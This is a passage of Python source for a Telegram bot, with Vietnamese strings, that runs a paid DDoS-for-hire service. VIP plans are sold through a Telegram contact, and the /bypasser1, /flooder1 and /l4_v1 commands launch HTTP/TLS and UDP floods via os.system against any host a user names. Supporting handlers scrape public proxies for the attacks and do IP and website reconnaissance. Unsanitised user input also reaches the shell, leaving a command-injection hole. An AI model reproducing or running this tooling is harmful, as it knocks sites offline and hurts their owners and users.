        # S·∫Øp x·∫øp c√°c video theo ch·∫•t l∆∞·ª£ng (∆∞u ti√™n t·ª´ cao xu·ªëng th·∫•p)
        video_url = None
        quality_priority = ["hd_no_watermark", "no_watermark", "watermark"]

        for quality in quality_priority:
            for media in medias:
                if media["type"] == "video" and media["quality"] == quality:
                    video_url = media["url"]
                    break
            if video_url:
                break

        if video_url:
            # G·ª≠i video v·ªõi ch·∫•t l∆∞·ª£ng cao nh·∫•t t√¨m ƒë∆∞·ª£c
            try:
                bot.send_video(
                    message.chat.id,
                    video_url,
                    caption=f"üé¨ **{title}**\nüë§ **T√°c Gi·∫£:** {author}",
                    parse_mode="Markdown"
                )
            except Exception as e:
                print(f"L·ªói khi g·ª≠i video: {str(e)}")
                bot.reply_to(
                    message,
                    f"‚ùå Kh√¥ng th·ªÉ g·ª≠i video tr·ª±c ti·∫øp. B·∫°n c√≥ th·ªÉ t·∫£i video t·∫°i: [Link video]({video_url})",
                    parse_mode="Markdown"
                )
        else:
            bot.reply_to(message, "‚ùå Kh√¥ng t√¨m th·∫•y video ph√π h·ª£p ƒë·ªÉ t·∫£i.")
    except Exception as e:
        print(f"L·ªói kh√¥ng mong mu·ªën: {str(e)}")
        bot.reply_to(message, f"‚ùå ƒê√£ x·∫£y ra l·ªói")

ADMIN_ID1 = ["6033886040"]
VIP_FILE = "vip.json"

if not os.path.exists(VIP_FILE):
    with open(VIP_FILE, "w") as f:
        json.dump({}, f)

def load_vip():
    with open(VIP_FILE, "r") as f:
        return json.load(f)

def save_vip(data):
    with open(VIP_FILE, "w") as f:
        json.dump(data, f, indent=4)

def check_vip(user_id):
    vip_data = load_vip()
    return str(user_id) in vip_data

def get_user_plan(user_id):
    vip_data = load_vip()
    return vip_data.get(str(user_id), None)

def check_cooldown(user_id, attack_type):
    if user_id in cooldowns and attack_type in cooldowns[user_id]:
        remaining = cooldowns[user_id][attack_type] - time.time()
        if remaining > 0:
            return int(remaining)
    return 0

def set_cooldown(user_id, attack_type, cooldown):
    if user_id not in cooldowns:
        cooldowns[user_id] = {}
    cooldowns[user_id][attack_type] = time.time() + cooldown

@bot.message_handler(commands=["ngocdoian"])
def start(message):
    user = message.from_user.username
    caption = f"""
<b>
‚óè Welcome to '@{user}' Back to Henry Private New Version
‚óè Update big?
‚û• New power: Powerful Layer 4-7 | New network power coming
‚û• New themes: Updated private bot banner theme

‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ
‚óè L·ªánh kh√°c:
‚û• /rules1: Xem quy t·∫Øc bot
‚û• /plan1: Ki·ªÉm tra g√≥i c·ªßa b·∫°n

‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ
‚óè L·ªánh t·∫•n c√¥ng g√≥i VIP:
‚û• /flooder1: [VIP-PLAN] RawFlood
‚û• /bypasser1: [VIP-PLAN] Bypass HTTP/2
‚û• /l4_v1: [VIP-PLAN] T·∫•n c√¥ng TCP SYN flood

‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ
‚óè L·ªánh mi·ªÖn ph√≠ ho·∫∑c (VIP):
‚û• /web1: [FREE-PLAN] L·∫•y th√¥ng tin trang web
‚û• /ip1: [FREE-PLAN] L·∫•y th√¥ng tin IP
‚û• /proxy1: [FREE-PLAN] L·∫•y proxy HTTP/s

‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ
‚óè L·ªánh qu·∫£n tr·ªã vi√™n:
‚û• /new_plan1: [ADMIN] Th√™m g√≥i VIP
‚û• /rm_plan1: [ADMIN] X√≥a g√≥i VIP
‚û• /server1: [ADMIN] Xem tr·∫°ng th√°i m√°y ch·ªß
</b>
"""
    bot.send_animation(message.chat.id, "https://files.catbox.moe/j2lg0n.gif", caption=caption, parse_mode="HTML")

@bot.message_handler(commands=["rules1"])
def rules(message):
    caption = """
<b>
‚óè Rules The Bot 
‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ
‚û• Kh√¥ng t·∫•n c√¥ng c√°c trang web c·ªßa ch√≠nh ph·ªß ho·∫∑c gi√°o d·ª•c.
‚û• Kh√¥ng chia s·∫ª g√≥i c·ªßa b·∫°n v·ªõi ng∆∞·ªùi kh√°c.
‚û• S·ª≠ d·ª•ng bot sai m·ª•c ƒë√≠ch s·∫Ω d·∫´n ƒë·∫øn l·ªánh c·∫•m vƒ©nh vi·ªÖn.
‚û• C√°c cu·ªôc t·∫•n c√¥ng ch·ªâ nh·∫±m m·ª•c ƒë√≠ch th·ª≠ nghi·ªám.
‚û• Kh√¥ng ho√†n l·∫°i ti·ªÅn sau khi mua g√≥i.
‚û• Tu√¢n th·ªß nghi√™m ng·∫∑t m·ªçi ƒëi·ªÅu kho·∫£n v√† ƒëi·ªÅu ki·ªán.

‚û• Thank you for using the bot.
</b>
"""
    bot.send_photo(message.chat.id, "https://files.catbox.moe/v03i8b.jpeg", caption=caption, parse_mode="HTML")


@bot.message_handler(commands=["plan1"])
def plan(message):
    user = message.from_user.username
    user_id = message.from_user.id

    if check_vip(user_id):
        plan_data = get_user_plan(user_id)
        caption = f"""
<b>
‚óè Your Plan The Bot Laucher
‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ
‚û• Username: @{user}
‚û• MaxTime: {plan_data["MaxTime"]}
‚û• Cooldown: {plan_data["Cooldown"]}
‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ
‚óè Thank to using bot
</b>
"""
    else:
        caption = "<blockquote>‚Ä¢ Currently you don't have a plan, please ibox t.me/ngocdoian to buy a plan</blockquote>"
    
    bot.send_animation(message.chat.id, "https://files.catbox.moe/e14wss.gif", caption=caption, parse_mode="HTML")

@bot.message_handler(commands=["bypasser1"])
def l7(message):
    args = message.text.split()
    if len(args) != 4:
        bot.send_message(message.chat.id, "Usage: /bypasser [Host] [Port] [Time]")
        return

    user_id = message.from_user.id
    if not check_vip(user_id):
        bot.send_message(message.chat.id, "<blockquote>‚Ä¢ Currently you don't have a plan, please ibox t.me/ngocdoian to buy a plan</blockquote>", parse_mode="HTML")
        return

    plan = get_user_plan(user_id)
    host, port, time_attack = args[1], args[2], int(args[3])

    if time_attack > plan["MaxTime"]:
        bot.send_message(message.chat.id, f"<blockquote>‚Ä¢ Enter Time From '30 to {plan['MaxTime']}' thank you</blockquote>", parse_mode="HTML")
        return

    cooldown_time = check_cooldown(user_id, "bypasser")
    if cooldown_time > 0:
        bot.send_message(message.chat.id, f"<blockquote>‚Ä¢ Please wait '{cooldown_time} seconds' to use again</blockquote>", parse_mode="HTML")
        return

    os.system(f"screen -dmS attack node tls {host} {time_attack} 17 3 http.txt")
    set_cooldown(user_id, "bypasser", plan["Cooldown"])

    caption = f"""
<b>
‚óè Your attack beling is laucher
‚û• Host: {host}
‚û• Port: {port}
‚û• Time: {time_attack}
‚û• Method: .bypasser
‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ
‚óè Your plan:
‚û• Username: @{message.from_user.username}
‚û• MaxTime: {plan["MaxTime"]}
‚û• Cooldown: {plan["Cooldown"]}
</b>
"""
    bot.send_animation(message.chat.id, "https://files.catbox.moe/nz3282.gif", caption=caption, parse_mode="HTML")

@bot.message_handler(commands=["flooder1"])
def l7(message):
    args = message.text.split()
    if len(args) != 4:
        bot.send_message(message.chat.id, "Usage: /flooder [Host] [Port] [Time]")
        return

    user_id = message.from_user.id
    if not check_vip(user_id):
        bot.send_message(message.chat.id, "<blockquote>‚Ä¢ Currently you don't have a plan, please ibox t.me/ngocdoian to buy a plan</blockquote>", parse_mode="HTML")
        return

    plan = get_user_plan(user_id)
    host, port, time_attack = args[1], args[2], int(args[3])

    if time_attack > plan["MaxTime"]:
        bot.send_message(message.chat.id, f"<blockquote>‚Ä¢ Enter Time From '30 to {plan['MaxTime']}' thank you</blockquote>", parse_mode="HTML")
        return

    cooldown_time = check_cooldown(user_id, "flooder")
    if cooldown_time > 0:
        bot.send_message(message.chat.id, f"<blockquote>‚Ä¢ Please wait '{cooldown_time} seconds' to use again</blockquote>", parse_mode="HTML")
        return

    os.system(f"screen -dmS attack node tls {host} {time_attack} 32 4 http.txt")
    set_cooldown(user_id, "flooder", plan["Cooldown"])

    caption = f"""
<b>
‚óè Your attack beling is laucher
‚û• Host: {host}
‚û• Port: {port}
‚û• Time: {time_attack}
‚û• Method: .flooder
‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ
‚óè Your plan:
‚û• Username: @{message.from_user.username}
‚û• MaxTime: {plan["MaxTime"]}
‚û• Cooldown: {plan["Cooldown"]}
</b>
"""
    bot.send_animation(message.chat.id, "https://files.catbox.moe/nz3282.gif", caption=caption, parse_mode="HTML")

@bot.message_handler(commands=["l4_v1"])
def l4(message):
    args = message.text.split()
    if len(args) != 4:
        bot.send_message(message.chat.id, "Usage: /l4 [IP] [Port] [Time]")
        return

    user_id = message.from_user.id
    if not check_vip(user_id):
        bot.send_message(message.chat.id, "<blockquote>‚Ä¢ Currently you don't have a plan, please ibox t.me/ngocdoian to buy a plan</blockquote>", parse_mode="HTML")
        return

    plan = get_user_plan(user_id)
    ip, port, time_attack = args[1], args[2], int(args[3])

    if time_attack > plan["MaxTime"]:
        bot.send_message(message.chat.id, f"<blockquote>‚Ä¢ Enter Time From '30 to {plan['MaxTime']}' thank you</blockquote>", parse_mode="HTML")
        return

    cooldown_time = check_cooldown(user_id, "l4")
    if cooldown_time > 0:
        bot.send_message(message.chat.id, f"<blockquote>‚Ä¢ Please wait '{cooldown_time} seconds' to use again</blockquote>", parse_mode="HTML")
        return

    os.system(f"screen -dmS attack go run udp.go {ip} {port} {time_attack}")
    set_cooldown(user_id, "l4", plan["Cooldown"])

    caption = f"""
<b>
‚óè Your attack beling is laucher
‚û• Host: {ip}
‚û• Port: {port}
‚û• Time: {time_attack}
‚û• Method: .goodudp
‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ
‚óè Your plan:
‚û• Username: @{message.from_user.username}
‚û• MaxTime: {plan["MaxTime"]}
‚û• Cooldown: {plan["Cooldown"]}
</b>
"""
    bot.send_animation(message.chat.id, "https://files.catbox.moe/nz3282.gif", caption=caption, parse_mode="HTML")

@bot.message_handler(commands=["web1", "webstatus1"])
def web_status(message):
    args = message.text.split()
    if len(args) != 2:
        bot.send_message(message.chat.id, "<b>Usage:</b> /web [URL]", parse_mode="HTML")
        return

    url = args[1]
    image_path = "image.jpg"
    
    if os.path.exists(image_path):
        os.remove(image_path)

    subprocess.run(["screen", "-dmS", "capture", "python3", "cap.py", url])

    time.sleep(10)

    if not os.path.exists(image_path):
        bot.send_message(message.chat.id, f"<b>‚Ä¢ {url} is unreachable.</b>", parse_mode="HTML")
        return

    try:
        domain = url.replace("http://", "").replace("https://", "").split("/")[0]
        ip_address = socket.gethostbyname(domain)

        response = requests.get(url, timeout=5)
        status = response.status_code
        response_time = round(response.elapsed.total_seconds(), 2)
        soup = BeautifulSoup(response.text, "html.parser")
        title = soup.title.string if soup.title else "Unknown"

        ip_api = requests.get(f"http://ip-api.com/json/{ip_address}").json()
        isp = ip_api.get("isp", "Unknown")
        org = ip_api.get("org", "Unknown")
        country = ip_api.get("country", "Unknown")
        timezone = ip_api.get("timezone", "Unknown")

        caption = f"""
<b>
‚óè Url Info
‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ
‚û• Host: {url}
‚û• Title: {title}
‚û• Status: {status}
‚û• Response Time: {response_time} seconds
‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ
‚û• IP: {ip_address}
‚û• ISP: {isp}
‚û• Org: {org}
‚û• Country: {country}
‚û• Timezone: {timezone}
</b>
""" if status == 200 else f"<b>Fail Checker:</b> {url} is down. Status: {status}"

        with open(image_path, "rb") as photo:
            bot.send_photo(message.chat.id, photo, caption=caption, parse_mode="HTML")

    except Exception:
        bot.send_message(message.chat.id, f"<b>‚Ä¢ {url} is unreachable.</b>", parse_mode="HTML")

    finally:
        if os.path.exists(image_path):
            os.remove(image_path)

@bot.message_handler(commands=["ip1"])
def check_ip(message):
    args = message.text.split()
    if len(args) != 2:
        bot.send_message(message.chat.id, "<b>Usage: /ip [IP]</b>", parse_mode="HTML")
        return

    ip = args[1]
    response = requests.get(f"http://ip-api.com/json/{ip}").json()
    
    if response["status"] == "fail":
        caption = "<b>‚Ä¢ Invalid IP address.</b>"
    else:
        caption = f"""
<b>
‚óè IP Lookup:
‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ
‚û• IP: {ip}
‚û• Country: {response["country"]}
‚û• Region: {response["regionName"]}
‚û• City: {response["city"]}
‚û• ISP: {response["isp"]}
‚û• Org: {response["org"]}
‚û• Lat/Lon: {response["lat"]}, {response["lon"]}
‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ
</b>
"""
    bot.send_animation(message.chat.id, "https://files.catbox.moe/7sn07u.gif", caption=caption, parse_mode="HTML")

@bot.message_handler(commands=["new_plan"])
def new_plan(message):
    if str(message.from_user.id) not in ADMIN_ID1:
        return

    args = message.text.split()
    if len(args) != 4:
        bot.send_message(message.chat.id, "Usage: /new_plan [ID] [MaxTime] [Cooldown]")
        return

    user_id, max_time, cooldown = args[1], int(args[2]), int(args[3])
    vip_data = load_vip()
    vip_data[user_id] = {"MaxTime": max_time, "Cooldown": cooldown}
    save_vip(vip_data)

    bot.send_message(message.chat.id, f"‚Ä¢ Success add New Plan: ID: {user_id} | MaxTime: {max_time} | Cooldown: {cooldown}")

@bot.message_handler(commands=["rm_plan1"])
def rm_plan(message):
    if str(message.from_user.id) not in ADMIN_ID1:
        return

    args = message.text.split()
    if len(args) != 2:
        bot.send_message(message.chat.id, "Usage: /rm_plan [ID]")
        return

    user_id = args[1]
    vip_data = load_vip()
    vip_data.pop(user_id, None)
    save_vip(vip_data)

    bot.send_message(message.chat.id, f"‚Ä¢ Removed ID: {user_id}")

GIF_URL = "https://files.catbox.moe/7bjfud.gif"

import platform

def get_server_status(message):
    uptime = time.time() - psutil.boot_time()
    uptime_str = time.strftime("%H:%M:%S", time.gmtime(uptime))
    
    system = platform.system()
    release = platform.release()
    version = platform.version()
    arch = platform.architecture()[0]
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)

    cpu_freq = psutil.cpu_freq().max if psutil.cpu_freq() else 0
    cpu_cores = os.cpu_count()
    cpu_usage = psutil.cpu_percent()

    ram = psutil.virtual_memory()
    ram_total = round(ram.total / (1024**3), 2)
    ram_used = round(ram.used / (1024**3), 2)

    disk = psutil.disk_usage('/')
    disk_total = round(disk.total / (1024**3), 2)
    disk_used = round(disk.used / (1024**3), 2)
    disk_percent = disk.percent

    net_io = psutil.net_io_counters()
    net_sent = net_io.bytes_sent / (1024**2)
    net_recv = net_io.bytes_recv / (1024**2)

    status = f"""
‚óè Server Status:
‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ
‚û• OS: {system} {release} ({arch})
‚û• OS Version: {version}
‚û• Uptime: {uptime_str}
‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ
‚û• CPU: {cpu_cores} Cores - {cpu_freq:.2f} MHz
‚û• CPU Usage: {cpu_usage}%
‚û• RAM: {ram_used} / {ram_total} GB
‚û• Disk: {disk_used} / {disk_total} GB ({disk_percent}% used)
‚û• Network: {net_sent:.2f}MB Sent / {net_recv:.2f}MB Received
‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ
"""

    if str(message.from_user.id) in ADMIN_ID1:
        status = status.replace("‚óè", "<b>‚óè</b>").replace("‚û•", "<b>‚û•</b>")

    return status

@bot.message_handler(commands=['server1'])
def server_status(message):
    status = get_server_status(message)
    bot.send_animation(message.chat.id, GIF_URL, caption=status, parse_mode="HTML" if str(message.from_user.id) in ADMIN_ID1 else None)

proxy_sources = [
'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=3000&country=all&ssl=all&anonymity=all',

'https://proxyspace.pro/https.txt'

]

def fetch_proxies():
    proxies = set()
    for url in proxy_sources:
        try:
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                proxies.update(response.text.strip().split("\n"))
        except:
            pass
    return list(proxies)

def check_proxy(proxy):
    try:
        response = requests.get(f"http://ip-api.com/json/{proxy.split(':')[0]}?fields=country", timeout=1)
        if response.status_code == 200:
            country = response.json().get("country", "Unknown")
            return proxy, country
    except:
        return None

def check_proxies(proxies, msg, chat_id):
    total = len(proxies)
    good_proxies = []
    bad_count = 0
    country_count = Counter()
    lock = threading.Lock()

    def worker(proxy):
        nonlocal bad_count
        result = check_proxy(proxy)
        if result:
            with lock:
                good_proxies.append(result[0])
                country_count[result[1]] += 1
        else:
            with lock:
                bad_count += 1

    threads = []
    for proxy in proxies:
        thread = threading.Thread(target=worker, args=(proxy,))
        thread.start()
        threads.append(thread)

        if len(threads) >= 10000:
            for t in threads:
                t.join()
            threads = []
            progress = ((len(good_proxies) + bad_count) / total) * 100
            bot.edit_message_text(f"<b>‚û• Start Checker Proxy {progress:.2f}%</b>", chat_id, msg.message_id, parse_mode="HTML")
            time.sleep(7)

    for t in threads:
        t.join()

    file_id = random.randint(10000, 99999)
    filename = f"good_proxy_{file_id}.txt"

    with open(filename, "w") as f:
        f.write("\n".join(good_proxies))

    caption = f"<b>[üß¨] Successfully Proxy:</b>\n\n<b>‚û• Total:</b> {total}\n<b>‚û• Good:</b> {len(good_proxies)}\n<b>‚û• Bad:</b> {bad_count}\n\n<b>‚û• Country:</b>\n‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ\n"
    for country, count in country_count.items():
        caption += f"<b>‚óè {country}:</b> {count}\n"

    for i in range(msg.message_id, msg.message_id - 10, -1):
        try:
            bot.delete_message(chat_id, i)
        except:
            pass

    gif_url = "https://files.catbox.moe/axf9wn.gif"
    msg = bot.send_animation(chat_id, gif_url, caption=caption, parse_mode="HTML")
    
    bot.send_document(chat_id, open(filename, "rb"), reply_to_message_id=msg.message_id)

    os.remove(filename)

@bot.message_handler(commands=['proxy1'])
def proxy_handler(message):
    chat_id = message.chat.id
    loading_msg = bot.send_message(chat_id, "<b>[üî´] Fetching proxies, Please wait </b>", parse_mode="HTML")
    proxies = fetch_proxies()
    bot.delete_message(chat_id, loading_msg.message_id)

    if not proxies:
        bot.send_message(chat_id, "<b>‚û• No new proxies found!</b>", parse_mode="HTML")
        return

    bot.send_message(chat_id, f"<b>‚û• Successfully Fetch Proxy: {len(proxies)}</b>", parse_mode="HTML")
    msg = bot.send_message(chat_id, "<b>‚û• Start Checker Proxy 0%</b>", parse_mode="HTML")
    check_proxies(proxies, msg, chat_id)

@bot.message_handler(func=lambda message: message.reply_to_message and message.reply_to_message.from_user.id == bot.get_me().id)
def continue_gemini_conversation(message):
    user_id = message.from_user.id
    # L·∫•y n·ªôi dung tin nh·∫Øn reply
    input_text = message.text.strip()
    # Th√™m tin nh·∫Øn c·ªßa ng∆∞·ªùi d√πng v√†o l·ªãch s·ª≠ cu·ªôc tr√≤ chuy·ªán
    conversation_history[user_id].append({"role": "user", "content": input_text})
    # G·ªçi API v√† tr·∫£ l·ªùi ng∆∞·ªùi d√πng
    send_to_gemini_api(message, user_id, input_text)
def send_to_gemini_api(message, user_id, input_text):
    # T·∫°o payload JSON v·ªõi l·ªãch s·ª≠ cu·ªôc tr√≤ chuy·ªán
    payload = {
        "contents": [
            {
                "parts": [{"text": msg["content"]} for msg in conversation_history[user_id]]  # L∆∞u t·∫•t c·∫£ tin nh·∫Øn trong cu·ªôc h·ªôi tho·∫°i
            }
        ]
    }
    headers = {
        'Content-Type': 'application/json'
    }
    try:
        # G·ª≠i y√™u c·∫ßu POST t·ªõi API Gemini
        response = requests.post(f'{BASE_URL}?key={API_KEY}', headers=headers, json=payload)
        # Ki·ªÉm tra v√† x·ª≠ l√Ω ph·∫£n h·ªìi
        if response.status_code == 200:
            data = response.json()
            # Tr√≠ch xu·∫•t ph·∫ßn text c·ªßa model t·ª´ ph·∫£n h·ªìi
            text_response = data['candidates'][0]['content']['parts'][0]['text']
            # Tr·∫£ l·ªùi ng∆∞·ªùi d√πng v√† gi·ªØ l·∫°i cu·ªôc h·ªôi tho·∫°i
            sent_message = bot.reply_to(message, f"{text_response}")
            # Th√™m c√¢u tr·∫£ l·ªùi c·ªßa model v√†o l·ªãch s·ª≠
            conversation_history[user_id].append({"role": "model", "content": text_response})
        else:
            error_message = response.json().get('error', {}).get('message', 'Kh√¥ng th·ªÉ l·∫•y d·ªØ li·ªáu.')
            bot.reply_to(message, f"L·ªói: {error_message}")
    except requests.exceptions.RequestException as e:
        bot.reply_to(message, f"C√≥ l·ªói x·∫£y ra khi k·∫øt n·ªëi API: {str(e)}")
    except Exception as e:
        bot.reply_to(message, f"L·ªói kh√¥ng x√°c ƒë·ªãnh")

# X√≥a webhook tr∆∞·ªõc khi s·ª≠ d·ª•ng polling
bot.remove_webhook()
print("Webhook ƒë√£ b·ªã x√≥a!")

bot.infinity_polling(timeout=60, long_polling_timeout = 1)
